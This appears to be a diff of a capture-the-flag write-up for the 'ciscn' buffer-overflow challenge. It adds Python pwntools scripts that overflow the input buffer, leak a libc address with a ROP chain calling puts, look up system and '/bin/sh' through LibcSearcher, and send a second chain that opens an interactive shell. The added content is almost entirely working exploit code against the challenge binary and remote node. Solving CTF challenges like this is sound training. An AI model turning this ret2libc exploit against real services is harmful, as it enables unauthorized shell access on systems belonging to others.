@@ -78,8 +78,8 @@ rop2 = b"\x00" * 88 + p64(pop_rdi_ret) + p64(bin_sh_addr) + p64(pop_rsi_r15_ret)
 from pwn import *
 from LibcSearcher import *
 
-# p = process("./ciscn")
-p = remote("node4.buuoj.cn", 29673)
+p = process("./ciscn")
+# p = remote("node4.buuoj.cn", 29673)
 elf = ELF("./ciscn")
 
 gets_got = elf.got["gets"]
@@ -98,6 +98,45 @@ gets_real_addr = u64(p.recv(6).ljust(8, b'\0'))
 libc = LibcSearcher("gets", gets_real_addr)
 
 libcbase = gets_real_addr - libc.dump("gets")
+system_addr = libcbase + libc.dump("system")
+bin_sh_addr = libcbase + libc.dump("str_bin_sh")
+
+pop_rsi_r15_ret = 0x400c81
+ret = 0x4006b9
+
+rop2 = b"\x00" * 88 + p64(ret) + p64(pop_rdi_ret) + p64(bin_sh_addr) + p64(pop_rsi_r15_ret) + p64(0) + p64(0) + p64(system_addr)
+
+p.sendlineafter("Input your choice!\n", "1")
+p.sendlineafter("Input your Plaintext to be encrypted\n", rop2)
+p.recvuntil("Ciphertext\n\n")
+
+p.interactive()
+```
+
+```
+from pwn import *
+from LibcSearcher import *
+
+# p = process("./ciscn")
+p = remote("node4.buuoj.cn", 28954)
+elf = ELF("./ciscn")
+
+puts_got = elf.got["puts"]
+puts_plt = elf.plt["puts"]
+main_addr = elf.symbols["main"]
+pop_rdi_ret = 0x400c83
+
+rop1 = b"\x00" * 88 + p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(main_addr)
+
+p.sendlineafter("Input your choice!\n", "1")
+p.sendlineafter("Input your Plaintext to be encrypted\n", rop1)
+p.recvuntil("Ciphertext\n\n")
+
+gets_real_addr = u64(p.recv(6).ljust(8, b'\0'))
+
+libc = LibcSearcher("puts", gets_real_addr)
+
+libcbase = gets_real_addr - libc.dump("puts")
 system_addr = libcbase + libc.dump("system")
 bin_sh_addr = libcbase + libc.dump("str_bin_sh")
 
